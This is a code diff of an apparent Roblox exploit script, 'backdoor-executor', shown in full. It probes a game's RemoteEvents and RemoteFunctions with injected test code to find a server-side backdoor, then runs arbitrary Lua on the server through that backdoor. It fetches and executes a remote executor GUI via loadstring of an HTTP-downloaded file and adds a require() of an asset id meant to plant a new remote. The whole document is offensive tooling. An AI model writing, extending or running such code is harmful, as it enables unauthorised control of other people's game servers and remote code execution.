@@ -2,12 +2,14 @@
 local starterGui = game:GetService("StarterGui")
 -- variables
 local config
+local testSource = [[local daValue=Instance.new("StringValue");daValue.Name,daValue.Parent,daValue.Value=game.PlaceId,workspace,"%s";task.delay(5, daValue.Destroy, daValue)]]
 local configRaw = (
 	if isfile("bexe-config.lua") then
 		readfile("bexe-config.lua")
 	else
 		game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua")
 )
+local scannedEvents = table.create(0)
 local eventInfo = {
 	["foundBackdoor"] = false,
 	["instance"] = nil,
@@ -18,10 +20,32 @@ local eventInfo = {
 local msgOutputs = {
 	["attached"] = "\n Attached Event: %s\n Type: %s",
 	["printEvent"] = "\n Event: %s\n Type: %s",
-	["outdatedCache"] = "Failed to load the backdoor cache of [%s], it might be outdated."
+	["outdatedCache"] = "Failed to load the backdoor cache of [%s], it might be outdated.",
+	["outdatedConfig"] = "backdoor-executor.lua configuration is outdated! \nIt is recommended to update the configuration to prevent errors.",
 }
-local testSource = [[local daValue=Instance.new("StringValue");daValue.Name,daValue.Parent,daValue.Value=game.PlaceId,workspace,"%s";task.delay(5, daValue.Destroy, daValue)]]
-local scannedEvents = table.create(0)
+local stringifiedTypes = {
+	EnumItem = function(value)
+		return string.format("Enum.%s.%s", value.EnumType, value.Name)
+	end,
+	CFrame = function(value)
+		return string.format("CFrame.new(%s)", tostring(value))
+	end,
+	Vector3 = function(value)
+		return string.format("Vector3.new(%s)", tostring(value))
+	end,
+	BrickColor = function(value)
+		return string.format("BrickColor.new(\"%s\")", value.Name)
+	end,
+	Color3 = function(value)
+		return string.format("Color3.new(%s)", tostring(value))
+	end,
+	string = function(value)
+		return string.format("\"%s\"", value)
+	end,
+	Ray = function(value)
+		return string.format("Ray.new(Vector3.new(%s), Vector3.new(%s))", tostring(value.Origin), tostring(value.Direction))
+	end
+}
 -- functions
 local function sendNotification(text)
 	return starterGui:SetCore("SendNotification", {
@@ -47,14 +71,13 @@ local function isRemoteAllowed(object)
 	local objectPath = object:GetFullName()
 
 	if (not (object:IsA("RemoteEvent") or object:IsA("RemoteFunction"))) or
-		table.find(scannedEvents, objectPath) or
-		config.blacklistSettings.eventNames[object.Name] or
-		(object.Parent and config.blacklistSettings.eventParentNames[object.Parent.Name]) or
-		((object.Parent and object.Parent:IsA("ReplicatedStorage") and object:FindFirstChild("__FUNCTION")) or
-		(object.Name == "__FUNCTION" and object.Parent:IsA("RemoteEvent") and object.Parent.Parent:IsA("ReplicatedStorage"))) or
-		string.find(objectPath, "HDAdminClient") or string.find(objectPath, "Basic Admin Essentials") or
-		(object.Parent and object.Parent:IsA("RobloxReplicatedStorage"))
+		table.find(scannedEvents, objectPath)
 	then
+		return false
+	end
+
+	for filterName, filterFunc in config.remoteFilters do
+		if not filterFunc(object) then continue end
 		return false
 	end
 	return true
@@ -77,6 +100,31 @@ local function getRemotes()
 	return remotes
 end
 
+local function getStringifiedType(value)
+	local stringifier = stringifiedTypes[typeof(value)]
+
+	return (
+		if stringifier then
+			stringifier(value)
+		else
+			typeof(value)
+	)
+end
+
+
+local function applyMacros(source)
+	for macroName, macroValue in config.scriptMacros do
+		macroValue = getStringifiedType(
+			if typeof(macroValue) == "function" then
+				macroValue(macroValue)
+			else
+				macroValue
+		)
+		source = string.gsub(source, "%" .. macroName .. "%", macroValue)
+	end
+	return source
+end
+
 local function getEventFunc(object)
 	return (
 		if object:IsA("RemoteEvent") then
@@ -89,6 +137,7 @@ end
 
 local function execScript(source)
 	if not eventInfo.foundBackdoor then return end
+	source = applyMacros(source)
 	local eventFunc = getEventFunc(eventInfo.instance)
 	eventInfo.args[eventInfo.argSrcIndex] = (if eventInfo.srcFunc then eventInfo.srcFunc(source) else source)
 
@@ -113,6 +162,12 @@ local function onAttached(eventObj, params)
 		["instance"] = eventObj,
 	})
 
+	if config.redirectRemote then -- doesn't work
+		execScript("require(11906423264)(%userid%)")
+		local newRemote = game:GetService("ReplicatedStorage"):WaitForChild("bexe-remote")
+		eventInfo.instance = newRemote
+	end
+
 	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
 		customExecution = true,
 		executeFunc = execScript,
@@ -124,18 +179,24 @@ end
 
 local function findBackdoors()
 	if eventInfo.foundBackdoor then return end
+	local connection do
+		connection = workspace.ChildAdded:Connect(function(object)
+			if object:IsA("StringValue") and
+				object.Name == tostring(game.PlaceId) and
+				object.Value ~= ""
+			then
+				onAttached(pathToInstance(object.Value))
+				connection:Disconnect()
+			end
+		end)
+	end
 
 	for _, object in getRemotes() do
+		if eventInfo.foundBackdoor then break end
 		local eventFunc, objectPath = getEventFunc(object), object:GetFullName()
 
 		print(string.format(msgOutputs.printEvent, object:GetFullName(), object.ClassName))
 		pcall(task.spawn, eventFunc, object, string.format(testSource, objectPath))
-
-		local execResult = workspace:FindFirstChild(game.PlaceId)
-		if execResult and execResult.Value ~= "" then
-			onAttached(pathToInstance(execResult.Value))
-			break
-		end
 
 		table.insert(scannedEvents, objectPath)
 		task.wait()
@@ -156,6 +217,8 @@ do -- "initialization"?
 			writefile("bexe-config.lua", configRaw)
 			loadedConfig = loadstring(configRaw)()
 		end
+
+		if loadedConfig.configVer < 4 then warn(msgOutputs.outdatedConfig) end
 		config = loadedConfig
 	end
 end
